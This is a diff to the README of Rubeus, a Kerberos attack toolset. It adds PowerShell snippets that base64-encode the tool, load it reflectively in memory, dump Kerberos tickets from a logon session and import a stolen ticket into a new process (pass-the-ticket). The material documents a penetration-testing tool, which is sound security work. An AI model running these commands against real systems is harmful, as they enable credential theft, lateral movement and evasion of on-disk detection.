@@ -926,3 +926,25 @@ To build Rubeus as a library, under **Project** -> **Rubeus Properties** -> chan
 
 
 You can then use [ILMerge](https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630) to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.
+
+
+### Sidenote: Running Rubeus Through PowerShell
+
+If you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:
+
+    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Rubeus.exe")) | Out-File -Encoding ASCII C:\Temp\rubeus.txt
+
+Rubeus can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded Rubeus assembly string):
+
+    $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
+
+The Main() method and any arguments can then be invoked as follows:
+
+    [Rubeus.Program]::Main("dump /luid:3050142".Split())
+
+Or individual functions can be invoked:
+
+    $KerbTicket = 'do...' # base64-encoded ticket.kirbi
+    $TicketBytes = [convert]::FromBase64String($KerbTicket)
+    $LogonID = [Rubeus.LSA]::CreateProcessNetOnly("mmc.exe", $false)
+    [Rubeus.LSA]::ImportTicket($TicketBytes, $LogonID)
